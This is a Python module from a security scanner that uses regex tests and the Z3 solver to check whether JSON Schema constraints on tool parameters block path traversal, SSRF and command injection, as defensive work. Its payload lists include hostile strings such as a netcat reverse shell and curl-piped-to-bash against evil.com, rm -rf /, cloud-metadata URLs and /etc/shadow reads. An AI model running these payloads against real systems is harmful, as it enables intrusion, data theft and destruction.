"""L4 Z3 Formal Verification: prove or disprove constraint sufficiency.

Takes parameters that HAVE constraints (pattern/enum) and formally verifies
whether those constraints block specific attack classes.  Complements L3
heuristic detection with mathematical proofs.

Two-tier checking:
  Tier 1 (Python, fast): Test concrete attack payloads via ``re.search()``
      (JSON Schema ``pattern`` uses ECMA-262 search semantics).
  Tier 2 (Z3, formal): If Tier 1 finds no match, use Z3 to prove/disprove
      whether ANY string matching the pattern can contain the attack sequence.

Checks:
  L4_001  Path traversal pattern bypass
  L4_002  SSRF URL pattern bypass
  L4_003  Command injection pattern bypass
  L4_004  Pattern-length contradiction (unsatisfiable schema)
  L4_005  Unsafe enum values
"""

from __future__ import annotations

import logging
import re
from typing import TYPE_CHECKING, Any

from munio.scan.layers.l3_static import (
    _collect_properties,
    _is_command_param,
    _is_path_param,
    _is_template_param,
    _is_url_param,
    _normalize_param_name,
    _resolve_type,
    _split_segments,
    _type_allows,
)
from munio.scan.models import (
    AttackType,
    Finding,
    FindingSeverity,
    Layer,
    ToolDefinition,
)

if TYPE_CHECKING:
    from collections.abc import Sequence

logger = logging.getLogger(__name__)

# ── Constants ────────────────────────────────────────────────────────────

_Z3_TIMEOUT_MS = 5000
_MAX_RECURSION_DEPTH = 10
_MAX_PROPERTIES = 200
_MAX_FINDINGS_PER_TOOL = 50
_MAX_Z3_CALLS_PER_TOOL = 20
_MAX_PATTERN_LENGTH = 1000

_VACUOUS_PATTERNS: frozenset[str] = frozenset(
    {
        ".*",
        "^.*$",
        ".+",
        "^.+$",
        "^.*",
        ".*$",
        ".+$",
        "^.+",
        r"[\s\S]*",
        r"[\s\S]+",
        # Grouped variants — semantically equivalent to .*/.+
        "(.*)",
        "^(.*)$",
        "(.+)",
        "^(.+)$",
        "(?:.*)",
        "^(?:.*)$",
        "(?:.+)",
        "^(?:.+)$",
    }
)

# ReDoS detection: nested quantifiers (a+)+ and polynomial 5+ consecutive
# quantified atoms [a-z]+[a-z]+[a-z]+[a-z]+[a-z]+ cause exponential/polynomial
# backtracking. Python re has NO timeout, so malicious schema patterns could
# hang the scan thread indefinitely.
_NESTED_QUANTIFIER_RE = re.compile(
    r"""
    \(              # open group
    [^)]*           # group contents
    [+*]            # inner quantifier
    [^)]*           # more group contents (including alternation |)
    \)              # close group
    \s*             # optional whitespace
    [+*?]           # outer quantifier
    """,
    re.VERBOSE,
)
_POLY_REDOS_RE = re.compile(
    r"(?:"
    r"(?:\[[^\]]*\]|\\[wWdDsS]|\.|\w)"  # atom
    r"[+*]\??"  # quantifier
    r"(?:\{[^}]*\})?"  # optional range
    r"){5,}"  # 5+ consecutive quantified atoms
)

# ── L4_001: Path traversal concrete payloads ─────────────────────────────

_PATH_TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "../etc/shadow",
    "foo/../../../etc/passwd",
    "./../../etc/passwd",
    "valid/path/../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "../.env",
    "../../.git/config",
)

_PATH_TRAVERSAL_SUBSTRINGS: list[str] = ["../", "..\\"]

# ── L4_002: SSRF URL concrete payloads ──────────────────────────────────

_SSRF_PAYLOADS: tuple[str, ...] = (
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://localhost/admin",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/latest/api/token",
    "http://10.0.0.1/",
    "http://10.255.255.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    "http://172.31.255.1/",
    "https://127.0.0.1:8443/",
    "http://0x7f000001/",
    "http://2130706433/",
    # H1: user@host bypass — URL authority section
    "http://user@169.254.169.254/",
    "http://evil@127.0.0.1/",
    "http://a@localhost/admin",
    # IPv4-mapped IPv6 and octal IP
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:169.254.169.254]/",
    "http://0177.0.0.1/",
)

_SSRF_SUBSTRINGS: list[str] = [
    "://169.254.169.254",
    "://127.0.0.1",
    "://localhost",
    "://0.0.0.0",
    "://[::1]",
    "://metadata.google.internal",
    # H2: Broadened private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
    "://10.",
    "://192.168.",
    "://172.",
    # H1: user@host bypass patterns
    "@169.254.169.254",
    "@127.0.0.1",
    "@localhost",
    # IPv4-mapped IPv6 and octal IP
    "[::ffff:",
    "://0177.",
]

# ── L4_003: Command injection concrete payloads ────────────────────────

_CMD_INJECTION_PAYLOADS: tuple[str, ...] = (
    "; ls -la /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& rm -rf /",
    "|| curl http://evil.com",
    "; nc -e /bin/sh evil.com 4444",
    "$(curl http://evil.com/shell.sh|bash)",
    "\n/bin/sh",
    "'; DROP TABLE users; --",
)

_CMD_INJECTION_SUBSTRINGS: list[str] = [";", "|", "&", "`", "$(", "\n"]

# ── L4_005: Unsafe enum value patterns ──────────────────────────────────

_ENUM_ATTACK_PATTERNS: tuple[tuple[re.Pattern[str], str, AttackType, str, FindingSeverity], ...] = (
    (
        re.compile(r"\.\.[/\\]"),
        "path traversal (../ or ..\\)",
        AttackType.PATH_TRAVERSAL,
        "CWE-22",
        FindingSeverity.CRITICAL,
    ),
    (
        re.compile(r"[;|&`]"),
        "shell metacharacter",
        AttackType.COMMAND_INJECTION,
        "CWE-78",
        FindingSeverity.CRITICAL,
    ),
    (
        re.compile(r"\$[\({]"),
        "command/variable substitution",
        AttackType.COMMAND_INJECTION,
        "CWE-78",
        FindingSeverity.CRITICAL,
    ),
    (
        re.compile(r"\{\{"),
        "template directive",
        AttackType.COMMAND_INJECTION,
        "CWE-1336",
        FindingSeverity.HIGH,
    ),
    (
        re.compile(r"<%"),
        "template directive (ERB/ASP)",
        AttackType.COMMAND_INJECTION,
        "CWE-1336",
        FindingSeverity.HIGH,
    ),
    (
        re.compile(r"169\.254\.169\.254"),
        "cloud metadata URL",
        AttackType.SSRF,
        "CWE-918",
        FindingSeverity.HIGH,
    ),
    (
        re.compile(r"127\.0\.0\.1|localhost", re.IGNORECASE),
        "localhost reference",
        AttackType.SSRF,
        "CWE-918",
        FindingSeverity.MEDIUM,
    ),
    (
        re.compile(r"file://|\\\\[a-zA-Z]"),
        "file URI or UNC path",
        AttackType.SSRF,
        "CWE-918",
        FindingSeverity.HIGH,
    ),
)


class L4Z3Analyzer:
    """L4 Z3 Formal Verification layer.

    Requires ``z3-solver`` package.  Returns empty findings if Z3
    is not installed (graceful degradation).
    """

    __slots__ = ("_report_safe", "_z3_budget", "_z3_ok")

    def __init__(self, *, report_safe: bool = False) -> None:
        from munio.scan.layers._z3_utils import z3_available

        self._report_safe = report_safe
        self._z3_budget = 0
        self._z3_ok = z3_available()

    @property
    def layer(self) -> Layer:
        """Return the analysis layer identifier."""
        return Layer.L4_Z3

    @property
    def available(self) -> bool:
        """Whether Z3 solver is installed and usable."""
        return self._z3_ok

    def analyze(self, tools: Sequence[ToolDefinition]) -> list[Finding]:
        """Run all L4 checks on tool definitions."""
        if not self._z3_ok:
            logger.info("L4 Z3 layer skipped: z3-solver not installed")
            return []

        findings: list[Finding] = []
        for tool in tools:
            try:
                findings.extend(self._analyze_tool(tool))
            except Exception:  # noqa: PERF203 — fail-closed per tool
                logger.warning(
                    "L4 analysis failed for tool '%s', skipping",
                    tool.name,
                    exc_info=True,
                )
        return findings

    def _analyze_tool(self, tool: ToolDefinition) -> list[Finding]:
        """Run L4 checks on a single tool.

        Uses ``_collect_properties`` to include properties from
        ``allOf``/``anyOf``/``oneOf``/``patternProperties`` (H3 fix).
        """
        schema = tool.input_schema
        properties = _collect_properties(schema)
        if not properties:
            return []

        self._z3_budget = _MAX_Z3_CALLS_PER_TOOL
        findings: list[Finding] = []
        count = 0
        for param_name, param_def in properties.items():
            if not isinstance(param_def, dict):
                continue
            count += 1
            if count > _MAX_PROPERTIES:
                break
            if len(findings) >= _MAX_FINDINGS_PER_TOOL:
                break
            try:
                findings.extend(self._check_parameter(tool.name, param_name, param_def))
            except Exception:
                logger.warning(
                    "L4 analysis failed for parameter '%s' in tool '%s', skipping",
                    param_name,
                    tool.name,
                    exc_info=True,
                )
        return findings

    def _check_parameter(
        self,
        tool_name: str,
        param_name: str,
        param_def: dict[str, Any],
        parent_path: str = "inputSchema.properties",
        depth: int = 0,
    ) -> list[Finding]:
        """Run all L4 checks on a single parameter."""
        if depth > _MAX_RECURSION_DEPTH:
            return []

        findings: list[Finding] = []
        location = f"{parent_path}.{param_name}"
        normalized = _normalize_param_name(param_name)
        segments = _split_segments(normalized)

        # String params only for pattern/enum checks
        if _type_allows(param_def, "string"):
            pattern = param_def.get("pattern")
            enum_vals = param_def.get("enum")

            if isinstance(pattern, str) and pattern not in _VACUOUS_PATTERNS:
                # L4_001: Path traversal pattern bypass
                if _is_path_param(normalized, segments):
                    findings.extend(
                        self._check_pattern_bypass(
                            tool_name,
                            param_name,
                            pattern,
                            param_def,
                            check_id="L4_001",
                            payloads=_PATH_TRAVERSAL_PAYLOADS,
                            attack_substrings=_PATH_TRAVERSAL_SUBSTRINGS,
                            attack_type=AttackType.PATH_TRAVERSAL,
                            cwe="CWE-22",
                            severity_sat=FindingSeverity.CRITICAL,
                            attack_desc="path traversal",
                            location=location,
                        )
                    )

                # L4_002: SSRF URL pattern bypass
                if _is_url_param(normalized, segments):
                    findings.extend(
                        self._check_pattern_bypass(
                            tool_name,
                            param_name,
                            pattern,
                            param_def,
                            check_id="L4_002",
                            payloads=_SSRF_PAYLOADS,
                            attack_substrings=_SSRF_SUBSTRINGS,
                            attack_type=AttackType.SSRF,
                            cwe="CWE-918",
                            severity_sat=FindingSeverity.HIGH,
                            attack_desc="SSRF",
                            location=location,
                        )
                    )

                # L4_003: Command injection pattern bypass
                if _is_command_param(normalized, segments):
                    findings.extend(
                        self._check_pattern_bypass(
                            tool_name,
                            param_name,
                            pattern,
                            param_def,
                            check_id="L4_003",
                            payloads=_CMD_INJECTION_PAYLOADS,
                            attack_substrings=_CMD_INJECTION_SUBSTRINGS,
                            attack_type=AttackType.COMMAND_INJECTION,
                            cwe="CWE-78",
                            severity_sat=FindingSeverity.CRITICAL,
                            attack_desc="command injection",
                            location=location,
                        )
                    )

                # L4_004: Pattern-length contradiction
                min_len = param_def.get("minLength")
                max_len = param_def.get("maxLength")
                if isinstance(min_len, int) or isinstance(max_len, int):
                    findings.extend(
                        self._check_pattern_length(
                            tool_name,
                            param_name,
                            pattern,
                            min_len if isinstance(min_len, int) else None,
                            max_len if isinstance(max_len, int) else None,
                            location,
                        )
                    )

            # L4_005: Unsafe enum values
            if isinstance(enum_vals, list):
                findings.extend(
                    self._check_unsafe_enum(
                        tool_name, param_name, enum_vals, normalized, segments, location
                    )
                )

        # Recurse into nested objects
        if _resolve_type(param_def) == "object":
            nested_props = param_def.get("properties")
            if isinstance(nested_props, dict):
                count = 0
                for nested_name, nested_def in nested_props.items():
                    if not isinstance(nested_def, dict):
                        continue
                    count += 1
                    if count > _MAX_PROPERTIES:
                        break
                    findings.extend(
                        self._check_parameter(
                            tool_name,
                            nested_name,
                            nested_def,
                            parent_path=f"{location}.properties",
                            depth=depth + 1,
                        )
                    )

        # Recurse into array items
        if _resolve_type(param_def) == "array":
            items = param_def.get("items")
            if isinstance(items, dict):
                findings.extend(
                    self._check_parameter(
                        tool_name,
                        f"{param_name}[]",
                        items,
                        parent_path=f"{location}.items",
                        depth=depth + 1,
                    )
                )

        return findings

    def _check_pattern_bypass(
        self,
        tool_name: str,
        param_name: str,
        pattern: str,
        param_def: dict[str, Any],
        *,
        check_id: str,
        payloads: tuple[str, ...],
        attack_substrings: list[str],
        attack_type: AttackType,
        cwe: str,
        severity_sat: FindingSeverity,
        attack_desc: str,
        location: str,
    ) -> list[Finding]:
        """Two-tier pattern bypass check.

        Tier 1: Test concrete payloads with ``re.search()`` (JSON Schema
        ``pattern`` uses ECMA-262 search semantics, not fullmatch).
        Tier 2: Z3 formal check if Tier 1 finds no match.
        """
        # Pattern length limit: unbounded re.compile() on attacker-controlled
        # patterns can be expensive.
        if len(pattern) > _MAX_PATTERN_LENGTH:
            logger.warning(
                "L4 %s: pattern too long (%d chars) on '%s.%s', skipping",
                check_id,
                len(pattern),
                tool_name,
                param_name,
            )
            return []

        # ReDoS check: skip patterns that could cause exponential or
        # polynomial backtracking.  Python re has NO timeout — a malicious
        # schema pattern would hang the scan thread indefinitely.
        if _NESTED_QUANTIFIER_RE.search(pattern) or _POLY_REDOS_RE.search(pattern):
            logger.warning(
                "L4 %s: skipping ReDoS-prone pattern '%s' on '%s.%s'",
                check_id,
                pattern,
                tool_name,
                param_name,
            )
            return []

        # Compile pattern; skip if invalid regex
        try:
            compiled = re.compile(pattern)
        except re.error:
            return []

        # ── Tier 1: Concrete payloads ─────────────────────────
        # C2 fix: JSON Schema `pattern` uses search semantics (ECMA-262
        # test()), not fullmatch.  A payload passes if the pattern
        # matches anywhere in the string.
        for payload in payloads:
            if compiled.search(payload):
                return [
                    self._finding(
                        check_id,
                        tool_name,
                        severity_sat,
                        f"Pattern on '{param_name}' allows {attack_desc}: "
                        f"concrete payload passes through",
                        location=location,
                        attack_type=attack_type,
                        cwe=cwe,
                        confidence=1.0,
                        counterexample=payload,
                        description=(
                            f"Tier 1 (Python): re.search() confirms pattern "
                            f"'{pattern}' allows the payload '{payload}'"
                        ),
                    )
                ]

        # ── Tier 2: Z3 formal check ──────────────────────────
        if self._z3_budget <= 0:
            logger.debug(
                "L4 %s: Z3 budget exhausted for '%s.%s'",
                check_id,
                tool_name,
                param_name,
            )
            return []

        from munio.scan.layers._z3_utils import (
            check_intersection,
            make_attack_regex,
            pattern_to_z3_search,
        )

        try:
            # C2 fix: Use search semantics — unanchored patterns get
            # wrapped with Full() to model JSON Schema search behavior.
            pattern_z3 = pattern_to_z3_search(pattern)
        except (ValueError, re.error):
            logger.debug(
                "L4 %s: cannot translate pattern '%s' to Z3, skipping",
                check_id,
                pattern,
            )
            return []

        attack_z3 = make_attack_regex(attack_substrings)

        max_length: int | None = None
        ml = param_def.get("maxLength")
        if isinstance(ml, int) and ml >= 0:
            max_length = ml

        self._z3_budget -= 1
        result, counterexample = check_intersection(
            pattern_z3,
            attack_z3,
            timeout_ms=_Z3_TIMEOUT_MS,
            max_length=max_length,
        )

        if result == "sat":
            return [
                self._finding(
                    check_id,
                    tool_name,
                    severity_sat,
                    f"Z3 proves pattern on '{param_name}' allows {attack_desc}",
                    location=location,
                    attack_type=attack_type,
                    cwe=cwe,
                    confidence=0.95,
                    counterexample=counterexample,
                    description=(
                        f"Tier 2 (Z3): Formal verification proves pattern "
                        f"'{pattern}' allows at least one string containing "
                        f"{attack_desc} sequences"
                    ),
                )
            ]

        if result == "unsat" and self._report_safe:
            return [
                self._finding(
                    check_id,
                    tool_name,
                    FindingSeverity.INFO,
                    f"Z3 confirms pattern on '{param_name}' blocks all {attack_desc} payloads",
                    location=location,
                    attack_type=attack_type,
                    cwe=cwe,
                    confidence=1.0,
                    description=(
                        f"Tier 2 (Z3): Formal verification proves no string "
                        f"matching pattern '{pattern}' can contain {attack_desc} "
                        f"sequences. The constraint is provably safe."
                    ),
                )
            ]

        # Z3 unknown — formal verification inconclusive.  Report as INFO
        # so users know this pattern wasn't formally verified.
        if result == "unknown":
            logger.warning(
                "L4 %s: Z3 returned unknown for pattern '%s' on '%s.%s'",
                check_id,
                pattern,
                tool_name,
                param_name,
            )
            return [
                self._finding(
                    check_id,
                    tool_name,
                    FindingSeverity.INFO,
                    f"Z3 verification inconclusive for pattern on '{param_name}' ({attack_desc})",
                    location=location,
                    attack_type=attack_type,
                    cwe=cwe,
                    confidence=0.0,
                    description=(
                        f"Z3 could not determine whether pattern '{pattern}' "
                        f"blocks all {attack_desc} payloads. "
                        f"Manual review recommended."
                    ),
                )
            ]

        return []

    def _check_pattern_length(
        self,
        tool_name: str,
        param_name: str,
        pattern: str,
        min_length: int | None,
        max_length: int | None,
        location: str,
    ) -> list[Finding]:
        """L4_004: Check if pattern + length constraints are contradictory."""
        if self._z3_budget <= 0:
            return []

        from munio.scan.layers._z3_utils import check_satisfiability, pattern_to_z3_search

        try:
            # Use search semantics: JSON Schema `pattern` is ECMA-262
            # test() (search, not fullmatch).  Fullmatch is too strict
            # and can report false contradictions for unanchored patterns.
            pattern_z3 = pattern_to_z3_search(pattern)
        except (ValueError, re.error):
            return []

        self._z3_budget -= 1
        result = check_satisfiability(
            pattern_z3,
            min_length=min_length,
            max_length=max_length,
            timeout_ms=_Z3_TIMEOUT_MS,
        )

        if result == "unsat":
            return [
                self._finding(
                    "L4_004",
                    tool_name,
                    FindingSeverity.MEDIUM,
                    f"Contradictory constraints on '{param_name}': no string "
                    f"can satisfy both pattern and length bounds",
                    location=location,
                    cwe="CWE-1286",
                    confidence=1.0,
                    description=(
                        f"Z3 proves no string can match pattern '{pattern}' "
                        f"and satisfy length constraints "
                        f"(minLength={min_length}, maxLength={max_length})"
                    ),
                )
            ]
        return []

    @staticmethod
    def _check_unsafe_enum(
        tool_name: str,
        param_name: str,
        enum_vals: list[Any],
        normalized: str,
        segments: list[str],
        location: str,
    ) -> list[Finding]:
        """L4_005: Check enum values for attack patterns."""
        is_security_relevant = (
            _is_path_param(normalized, segments)
            or _is_url_param(normalized, segments)
            or _is_command_param(normalized, segments)
            or _is_template_param(normalized, segments)
        )
        if not is_security_relevant:
            return []

        findings: list[Finding] = []
        for val in enum_vals:
            if not isinstance(val, str):
                continue
            for pat, desc, attack_type, cwe, severity in _ENUM_ATTACK_PATTERNS:
                if pat.search(val):
                    findings.append(
                        Finding(
                            id="L4_005",
                            layer=Layer.L4_Z3,
                            severity=severity,
                            tool_name=tool_name,
                            message=(
                                f"Unsafe enum value on '{param_name}': '{val}' contains {desc}"
                            ),
                            location=location,
                            attack_type=attack_type,
                            cwe=cwe,
                            confidence=1.0,
                            counterexample=val,
                        )
                    )
                    break  # One match per enum value
        return findings

    @staticmethod
    def _finding(
        finding_id: str,
        tool_name: str,
        severity: FindingSeverity,
        message: str,
        *,
        location: str = "",
        attack_type: AttackType | None = None,
        cwe: str | None = None,
        confidence: float = 1.0,
        counterexample: str | None = None,
        description: str = "",
    ) -> Finding:
        """Create an L4 Finding."""
        return Finding(
            id=finding_id,
            layer=Layer.L4_Z3,
            severity=severity,
            tool_name=tool_name,
            message=message,
            location=location,
            attack_type=attack_type,
            cwe=cwe,
            confidence=confidence,
            counterexample=counterexample,
            description=description,
        )
